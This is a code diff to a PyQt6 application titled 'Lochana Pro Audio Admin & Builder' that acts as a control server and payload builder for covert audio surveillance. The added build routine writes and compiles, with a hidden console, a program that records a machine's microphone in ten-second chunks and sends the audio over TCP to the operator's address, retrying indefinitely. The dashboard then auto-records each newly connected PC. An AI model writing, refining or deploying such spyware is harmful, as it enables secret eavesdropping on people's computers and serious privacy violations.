@@ -4,7 +4,7 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout
                              QScrollArea, QFrame, QHBoxLayout, QLineEdit, QMessageBox, QCheckBox)
 from PyQt6.QtCore import pyqtSignal, QObject, Qt
 
-
+# --- Configuration Management ---
 CONFIG_FILE = "settings.json"
 
 def save_settings(ip, port, auto_rec):
@@ -17,7 +17,7 @@ def load_settings():
             with open(CONFIG_FILE, "r") as f:
                 return json.load(f)
         except: pass
-    return {"ip": "127.0.0.1", "port": "65432", "auto_rec": False}
+    return {"ip": "0.0.0.0", "port": "8080", "auto_rec": False}
 
 class ServerSignals(QObject):
     update_ui = pyqtSignal(dict)
@@ -34,7 +34,7 @@ class ClientCard(QFrame):
         self.setup_ui()
 
     def setup_ui(self):
-        self.setMinimumHeight(350)
+        self.setMinimumHeight(300)
         self.setStyleSheet("background-color: #2c3e50; border-radius: 15px; padding: 20px; margin: 10px; border: 1px solid #34495e;")
         layout = QVBoxLayout(self)
         
@@ -43,14 +43,14 @@ class ClientCard(QFrame):
         icon_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
 
         name_lbl = QLabel(f"{self.hostname}\n{self.ip}")
-        name_lbl.setStyleSheet("font-weight: bold; color: white; font-size: 15px; border: none;")
+        name_lbl.setStyleSheet("font-weight: bold; color: white; font-size: 14px; border: none;")
         name_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
 
         self.btn_rec = QPushButton()
         self.btn_live = QPushButton()
 
         layout.addWidget(icon_lbl); layout.addStretch(); layout.addWidget(name_lbl)
-        layout.addSpacing(20); layout.addWidget(self.btn_rec); layout.addWidget(self.btn_live)
+        layout.addSpacing(15); layout.addWidget(self.btn_rec); layout.addWidget(self.btn_live)
         
         self.btn_rec.clicked.connect(self.toggle_rec)
         self.btn_live.clicked.connect(self.toggle_live)
@@ -73,7 +73,7 @@ class ClientCard(QFrame):
 class MainSystem(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Lochana Pro Audio Admin & Builder")
+        self.setWindowTitle("Lochana Pro Audio Admin & Builder v3.1")
         self.resize(1100, 750)
         self.client_widgets = {}
         self.running = True
@@ -96,11 +96,9 @@ class MainSystem(QMainWindow):
         dash_log_panel = QVBoxLayout()
         conf = load_settings()
         
-        # Auto-Record Checkbox  
         self.check_auto_rec = QCheckBox("Auto-Record New Connections")
         self.check_auto_rec.setChecked(conf.get('auto_rec', False))
         self.check_auto_rec.setStyleSheet("color: #e74c3c; font-weight: bold; font-size: 13px; margin-bottom: 10px;")
-        
         self.check_auto_rec.stateChanged.connect(self.log_auto_rec_status)
         
         dash_log_panel.addWidget(self.check_auto_rec)
@@ -116,16 +114,16 @@ class MainSystem(QMainWindow):
         settings_layout.setContentsMargins(100, 50, 100, 50); settings_layout.setAlignment(Qt.AlignmentFlag.AlignTop)
 
         self.ip_input = QLineEdit(conf['ip']); self.port_input = QLineEdit(conf['port'])
-        btn_save = QPushButton("💾 SAVE ALL SETTINGS"); btn_save.clicked.connect(self.save_conf)
-        self.btn_build = QPushButton("🔨 GENERATE PAYLOAD EXE"); self.btn_build.clicked.connect(self.build_exe)
+        btn_save = QPushButton("💾 SAVE SETTINGS"); btn_save.clicked.connect(self.save_conf)
+        self.btn_build = QPushButton("🔨 GENERATE OPTIMIZED PAYLOAD"); self.btn_build.clicked.connect(self.build_exe)
 
         input_style = "background-color: #333; color: white; padding: 12px; border-radius: 5px; margin-bottom: 10px;"
         self.ip_input.setStyleSheet(input_style); self.port_input.setStyleSheet(input_style)
         btn_save.setStyleSheet("background-color: #f39c12; color: white; height: 45px; font-weight: bold; border-radius: 5px;")
         self.btn_build.setStyleSheet("background-color: #2980b9; color: white; height: 65px; font-weight: bold; margin-top: 30px; border-radius: 10px;")
 
-        settings_layout.addWidget(QLabel("TARGET SERVER IP:")); settings_layout.addWidget(self.ip_input)
-        settings_layout.addWidget(QLabel("TARGET PORT:")); settings_layout.addWidget(self.port_input)
+        settings_layout.addWidget(QLabel("YOUR ZEROTIER IP:")); settings_layout.addWidget(self.ip_input)
+        settings_layout.addWidget(QLabel("LISTEN PORT:")); settings_layout.addWidget(self.port_input)
         settings_layout.addWidget(btn_save); settings_layout.addWidget(self.btn_build)
         
         self.build_log_list = QListWidget(); self.build_log_list.setFixedHeight(180)
@@ -146,19 +144,16 @@ class MainSystem(QMainWindow):
 
     def save_conf(self):
         save_settings(self.ip_input.text(), self.port_input.text(), self.check_auto_rec.isChecked())
-        QMessageBox.information(self, "Success", "Settings saved!")
+        QMessageBox.information(self, "Success", "Settings saved! Restart the app to bind to new port.")
 
     def add_client(self, info):
         ip = info['ip']
         if ip not in self.client_widgets:
-            is_auto = self.check_auto_rec.isChecked()
-            card = ClientCard(ip, info['hostname'], auto_start_rec=is_auto)
+            card = ClientCard(ip, info['hostname'], auto_start_rec=self.check_auto_rec.isChecked())
             self.client_widgets[ip] = card
             idx = self.grid_layout.count()
             self.grid_layout.addWidget(card, idx // 3, idx % 3)
-            log_msg = f"PC Connected: {ip}"
-            if is_auto: log_msg += " [AUTO-REC TRIGGERED]"
-            self.signals.update_dash_log.emit(log_msg)
+            self.signals.update_dash_log.emit(f"New PC Online: {ip}")
 
     def start_server(self):
         if not os.path.exists("recordings"): os.makedirs("recordings")
@@ -166,42 +161,45 @@ class MainSystem(QMainWindow):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                # 0.0.0.0 binds to all interfaces including ZeroTier
                 s.bind(('0.0.0.0', int(conf['port'])))
                 s.listen(10)
                 while self.running:
                     s.settimeout(1.0)
                     try:
                         conn, addr = s.accept()
-                        if self.running:
-                            self.signals.update_ui.emit({'ip': addr[0], 'hostname': f"PC-{addr[0].split('.')[-1]}"})
-                            threading.Thread(target=self.handle_client, args=(conn, addr[0]), daemon=True).start()
+                        self.signals.update_ui.emit({'ip': addr[0], 'hostname': f"PC-{addr[0].split('.')[-1]}"})
+                        threading.Thread(target=self.handle_client, args=(conn, addr[0]), daemon=True).start()
                     except socket.timeout: continue
-        except Exception as e: print(f"Server Error: {e}")
+        except Exception as e: self.signals.update_dash_log.emit(f"SERVER ERROR: {e}")
 
     def handle_client(self, conn, ip):
         with conn:
-            all_data = b''
+            data = b''
             while self.running:
                 try:
-                    chunk = conn.recv(16384); 
+                    chunk = conn.recv(32768)
                     if not chunk: break
-                    all_data += chunk
+                    data += chunk
                 except: break
             
-            if all_data and self.running and ip in self.client_widgets:
+            if data and ip in self.client_widgets:
                 card = self.client_widgets[ip]
+                # සේව් කරන්න කලින් ෆෝල්ඩර් එක හදමු
+                timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
+                fld = f"recordings/{ip.replace('.', '_')}"
+                if not os.path.exists(fld): os.makedirs(fld)
+
                 if card.is_recording:
-                    fld = f"recordings/{ip.replace('.', '_')}"
-                    if not os.path.exists(fld): os.makedirs(fld)
-                    existing = [f for f in os.listdir(fld) if f.startswith("rec_v_")]
-                    path = f"{fld}/rec_v_{len(existing) + 1}.wav"
-                    self.save_wav(path, all_data)
-                    self.signals.update_dash_log.emit(f"Saved: {ip} -> rec_v_{len(existing) + 1}")
-                
+                    path = f"{fld}/audio_{timestamp}.wav"
+                    self.save_wav(path, data)
+                    self.signals.update_dash_log.emit(f"Saved recording from {ip}")
+
                 if card.is_live:
-                    tmp = f"live_{ip.replace('.','_')}.wav"
-                    pygame.mixer.music.stop(); pygame.mixer.music.unload()
-                    self.save_wav(tmp, all_data); pygame.mixer.music.load(tmp); pygame.mixer.music.play()
+                    tmp = f"live_temp.wav"
+                    self.save_wav(tmp, data)
+                    pygame.mixer.music.load(tmp)
+                    pygame.mixer.music.play()
 
     def save_wav(self, name, data):
         try:
@@ -209,62 +207,46 @@ class MainSystem(QMainWindow):
                 wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100); wf.writeframes(data)
         except: pass
 
-    # --- Updated Build EXE Function ---
     def build_exe(self):
-        target_ip = self.ip_input.text()
-        target_port = self.port_input.text()
-        
+        ip, port = self.ip_input.text(), self.port_input.text()
         self.btn_build.setEnabled(False)
-        self.signals.update_build_log.emit(f"🔨 Building Payload for {target_ip}:{target_port}...")
+        self.signals.update_build_log.emit("🔨 Building payload with retry logic...")
         
         def run_build():
+            # Payload with Hardware-check and Retry logic
+            src = f"""import socket, sounddevice as sd, time, numpy as np
+def r():
+    FS = 44100
+    while True:
+        try:
+            # Mic detection
+            rec = sd.rec(int(10 * FS), samplerate=FS, channels=1, dtype='int16')
+            sd.wait()
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(10)
+                s.connect(('{ip}', {port}))
+                s.sendall(rec.tobytes())
+        except Exception as e:
+            time.sleep(10) # Wait and retry if connection or mic fails
+r()"""
+            with open("temp_p.py", "w") as f: f.write(src)
             try:
-                
-                if not os.path.exists("audio_sender.py"):
-                    self.signals.update_build_log.emit("❌ Error: audio_sender.py not found!")
-                    self.signals.build_done.emit("err")
-                    return
-
-                with open("audio_sender.py", "r", encoding="utf-8") as f:
-                    lines = f.readlines()
-
-                
-                new_lines = []
-                for line in lines:
-                    if line.strip().startswith("SERVER_IP ="):
-                        new_lines.append(f"SERVER_IP = '{target_ip}'\n")
-                    elif line.strip().startswith("PORT ="):
-                        new_lines.append(f"PORT = {target_port}\n")
-                    else:
-                        new_lines.append(line)
-
-                
-                temp_filename = "temp_payload_build.py"
-                with open(temp_filename, "w", encoding="utf-8") as f:
-                    f.writelines(new_lines)
-
-              
-                subprocess.check_call([sys.executable, "-m", "PyInstaller", "--noconsole", "--onefile", "--name=audio_sender_payload", temp_filename])
-                
+                # --clean helps to avoid old cache issues
+                subprocess.check_call(["pyinstaller", "--noconsole", "--onefile", "--clean", "temp_p.py"])
                 self.signals.build_done.emit("ok")
-            except Exception as e:
-                self.signals.update_build_log.emit(f"❌ Error: {str(e)}")
-                self.signals.build_done.emit("err")
+            except: self.signals.build_done.emit("err")
             finally:
-                if os.path.exists(temp_filename):
-                    os.remove(temp_filename)
+                if os.path.exists("temp_p.py"): os.remove("temp_p.py")
 
         threading.Thread(target=run_build, daemon=True).start()
 
     def on_build_done(self, status):
         self.btn_build.setEnabled(True)
         if status == "ok":
-            self.signals.update_build_log.emit("✅ BUILD SUCCESS!")
-            QMessageBox.information(self, "Success", "Payload EXE created in 'dist' folder!")
-            if os.path.exists("dist"):
-                os.startfile(os.path.join(os.getcwd(), "dist"))
+            self.signals.update_build_log.emit("✅ BUILD COMPLETE: Check 'dist' folder.")
+            os.startfile(os.path.join(os.getcwd(), "dist"))
         else:
-            self.signals.update_build_log.emit("❌ BUILD FAILED!")
+            self.signals.update_build_log.emit("❌ BUILD FAILED: Check PyInstaller installation.")
 
     def closeEvent(self, event):
         self.running = False; pygame.mixer.quit(); event.accept()
